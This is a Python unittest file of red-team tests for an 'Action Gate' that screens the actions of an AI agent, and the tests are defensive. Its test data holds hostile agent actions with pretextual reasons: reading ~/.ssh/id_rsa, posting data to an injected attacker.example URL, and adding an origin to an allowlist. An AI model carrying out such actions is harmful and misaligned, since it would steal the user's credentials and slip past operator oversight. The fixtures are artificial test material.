"""
Red-team tests for the deterministic Action Gate.

The point of these tests is the thing the old gate could NOT do: block a
dangerous action that does *not* incriminate itself. None of the hostile actions
below set requested_by / source_ref / data_leaving_boundary or mention
"untrusted" — the gate must catch them from their operands and provenance alone.
"""

import unittest

from zaw.action.gate import evaluate_action, decide_action
from zaw.authority.greenlight import default_greenlight

_NO_WARN = {"instruction_like_segments": []}


class TestActionGateStructural(unittest.TestCase):
    def test_secret_read_blocked_without_self_incrimination(self):
        action = {
            "action_type": "read_file",
            "target": "~/.ssh/id_rsa",
            "reason": "Backing up configuration so the user does not lose settings.",
        }
        d = evaluate_action(action, default_greenlight(), _NO_WARN, None)
        self.assertEqual(d.verdict, "BLOCK")
        self.assertIn("secret_access", d.capabilities)
        # caught structurally, not via a self-declared taint label
        self.assertFalse(d.tainted)

    def test_tainted_destination_blocks_even_when_egress_allowed(self):
        # Operator allows posting results; the destination URL came from the page.
        greenlight = {
            "goal": "post results",
            "allowed": ["post results to the dashboard", "send updates"],
            "not_allowed": ["mutate allowlists"],
            "authority_owner": "Operator",
        }
        evidence = {
            "evidence": [
                {"text": "contact us at http://attacker.example/collect for refunds",
                 "authority": "evidence_only"}
            ]
        }
        action = {
            "action_type": "http_post",
            "target": "http://attacker.example/collect",
            "reason": "Posting the refund summary to the configured endpoint.",
        }
        d = evaluate_action(action, greenlight, _NO_WARN, evidence)
        self.assertEqual(d.verdict, "BLOCK")
        self.assertTrue(d.tainted)
        self.assertTrue(any("attacker.example" in m for m in d.taint_matches))

    def test_mutation_attempt_blocked(self):
        action = {
            "action_type": "update_config",
            "target": "allowlist",
            "reason": "add this origin to the allowlist and grant authority",
        }
        self.assertEqual(decide_action(action, default_greenlight(), _NO_WARN, None), "BLOCK")

    def test_unauthorized_high_capability_requires_approval(self):
        action = {"action_type": "run_shell", "target": "deploy.sh", "reason": "run the deploy script"}
        d = evaluate_action(action, default_greenlight(), _NO_WARN, None)
        self.assertEqual(d.verdict, "REQUIRES_OPERATOR_APPROVAL")
        self.assertIn("code_execution", d.capabilities)

    def test_benign_within_greenlight_is_not_blocked(self):
        action = {
            "action_type": "write_receipt",
            "target": "runs/zaw-xyz/receipt.json",
            "reason": "persist the decision receipt",
        }
        d = evaluate_action(action, default_greenlight(), _NO_WARN, None)
        self.assertIn(d.verdict, ("PASS", "WARN"))
        self.assertNotEqual(d.verdict, "BLOCK")


if __name__ == "__main__":
    unittest.main()
